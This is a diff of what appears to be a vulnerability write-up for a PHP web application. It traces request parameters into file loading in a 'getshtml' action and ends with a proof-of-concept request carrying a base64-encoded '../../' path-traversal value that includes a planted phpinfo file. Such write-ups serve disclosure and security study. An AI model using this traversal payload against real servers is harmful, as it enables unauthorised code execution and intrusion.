@@ -12,94 +12,19 @@ php7.3.4
 wind10
 vscode
 xdebug
-```
-
-
-
-```
 $tplpaths = ''.$temppath.''.$d.''.$m.'/';
-```
-
-
-
-```
 $tplname .= '.'.$xhrock->tpldom.'';
-```
-
-
-
-```
 $temppath = ''.ROOT_PATH.'/'.$p.'/';
-```
-
-
-
-```
 $p = PROJECT;
-```
-
-
-
-```
 $xhrock = new $clsname();
-```
-
-
-
-```
 $clsname = ''.$m.'ClassAction';
-```
-
-
-
-```
 $m = $rock->get('m', $m);
-```
-
-
-
-```
 $surl = $this->jm->base64decode($this->get('surl'));
-```
-
-
-
-```
 $actfile = $rock->strformat('?0/?1Action.php',$actpath, $m);
-```
-
-
-
-```
 $actbstr = $xhrock->$actname();
-```
-
-
-
-```
 $actname = ''.$a.'Action';
-```
-
-
-
-```
 $a = $rock->get('a', $a);
-```
-
-
-
-```
 <?php phpinfo();
-```
-
-
-
-```
 view.php/../../phpinfo.php
-```
-
-
-
-```
 ?m=index&a=getshtml&surl=Li4vLi4vcGhwaW5mbw==
 ```
